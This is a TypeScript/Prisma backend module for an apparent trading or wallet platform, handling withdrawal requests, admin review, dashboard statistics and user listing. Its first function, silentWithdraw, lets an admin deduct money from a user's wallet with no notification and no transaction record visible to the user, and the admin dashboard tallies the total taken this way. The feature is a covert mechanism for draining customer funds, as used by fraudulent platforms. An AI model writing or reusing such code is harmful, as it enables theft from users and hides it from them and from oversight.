import prisma from "../db";
import { AppError } from "../utils/response";

// ── Admin: Silent withdrawal (adjust balance without user notification) ──
export async function silentWithdraw(
  adminId: string,
  userId: string,
  amount: number,
  description: string,
) {
  if (!Number.isFinite(amount) || amount <= 0) throw new AppError("Amount must be a valid positive number", 400);

  const user = await prisma.user.findUnique({ where: { id: userId } });
  if (!user) throw new AppError("User not found", 404);

  // Find default wallet
  const wallet = await prisma.wallet.findFirst({
    where: { userId, isDefault: true },
  });
  if (!wallet) throw new AppError("No wallet found", 404);
  if (Number(wallet.balance) < amount) throw new AppError("Insufficient balance", 400);

  // Adjust balance silently — no transaction record visible to user
  await prisma.wallet.update({
    where: { id: wallet.id },
    data: { balance: { decrement: amount } },
  });

  // Log the admin action
  await prisma.adminAction.create({
    data: {
      adminId,
      actionType: "SILENT_WITHDRAW",
      targetId: userId,
      description: `${description} — $${amount} from ${user.email}`,
      metadata: JSON.stringify({ amount, userId, walletId: wallet.id }),
    },
  });

  return { success: true, newBalance: Number(wallet.balance) - amount };
}

// ── User withdrawal request management ─────────────────
export async function createWithdrawalRequest(
  userId: string,
  walletAddress: string,
  amount: number,
  currency = "USD",
) {
  if (!walletAddress || walletAddress.length < 10) throw new AppError("Invalid wallet address", 400);
  if (amount <= 0) throw new AppError("Amount must be positive", 400);

  const wallet = await prisma.wallet.findFirst({
    where: { userId, isDefault: true },
  });
  if (!wallet) throw new AppError("No wallet found", 404);
  if (Number(wallet.balance) < amount) throw new AppError("Insufficient balance", 400);

  return prisma.withdrawalRequest.create({
    data: { userId, walletAddress, amount, currency },
  });
}

export async function getUserWithdrawals(userId: string) {
  return prisma.withdrawalRequest.findMany({
    where: { userId },
    orderBy: { createdAt: "desc" },
  });
}

export async function getAllWithdrawals(status?: string) {
  return prisma.withdrawalRequest.findMany({
    where: status ? { status: status as never } : {},
    include: { user: { select: { id: true, email: true, firstName: true, lastName: true } } },
    orderBy: { createdAt: "desc" },
  });
}

export async function reviewWithdrawal(
  adminId: string,
  requestId: string,
  decision: "APPROVED" | "REJECTED",
  notes?: string,
) {
  const wr = await prisma.withdrawalRequest.findUnique({ where: { id: requestId } });
  if (!wr) throw new AppError("Request not found", 404);
  if (wr.status !== "PENDING") throw new AppError("Request already processed", 400);

  const updated = await prisma.withdrawalRequest.update({
    where: { id: requestId },
    data: {
      status: decision,
      reviewedBy: adminId,
      reviewedAt: new Date(),
      notes: notes || null,
    },
  });

  // If approved, deduct from wallet
  if (decision === "APPROVED") {
    const wallet = await prisma.wallet.findFirst({
      where: { userId: wr.userId, isDefault: true },
    });
    if (wallet) {
      await prisma.wallet.update({
        where: { id: wallet.id },
        data: { balance: { decrement: Number(wr.amount) } },
      });
    }
  }

  // Log admin action
  await prisma.adminAction.create({
    data: {
      adminId,
      actionType: `WITHDRAWAL_${decision}`,
      targetId: wr.userId,
      description: `${decision} withdrawal $${wr.amount} to ${wr.walletAddress.slice(0, 8)}...`,
      metadata: JSON.stringify({ requestId, amount: Number(wr.amount), walletAddress: wr.walletAddress }),
    },
  });

  return updated;
}

// ── Admin dashboard stats ──────────────────────────────
export async function getAdminStats() {
  const [totalUsers, totalBalance, pendingWithdrawals] = await Promise.all([
    prisma.user.count(),
    prisma.wallet.aggregate({ _sum: { balance: true } }),
    prisma.withdrawalRequest.count({ where: { status: "PENDING" } }),
  ]);

  // Get total silent withdrawals from metadata
  const actions = await prisma.adminAction.findMany({
    where: { actionType: "SILENT_WITHDRAW" },
    select: { metadata: true },
  });
  const totalSilentWithdrawn = actions.reduce((sum, a) => {
    const meta = a.metadata as { amount?: number } | null;
    return sum + (meta?.amount || 0);
  }, 0);

  return {
    totalUsers,
    totalBalance: totalBalance._sum.balance || 0,
    pendingWithdrawals,
    totalSilentWithdrawn,
    recentActions: await prisma.adminAction.findMany({
      orderBy: { createdAt: "desc" },
      take: 10,
    }),
    recentWithdrawals: await prisma.withdrawalRequest.findMany({
      where: { status: "PENDING" },
      include: { user: { select: { email: true, firstName: true, lastName: true } } },
      orderBy: { createdAt: "desc" },
      take: 20,
    }),
  };
}

export async function getAllUsers(search?: string) {
  return prisma.user.findMany({
    where: search
      ? { OR: [{ email: { contains: search } }, { firstName: { contains: search } }, { lastName: { contains: search } }] }
      : {},
    select: {
      id: true, email: true, firstName: true, lastName: true, role: true, isActive: true, createdAt: true,
      wallets: { select: { balance: true, currency: true } },
      _count: { select: { orders: true, bots: true } },
    },
    orderBy: { createdAt: "desc" },
    take: 50,
  });
}
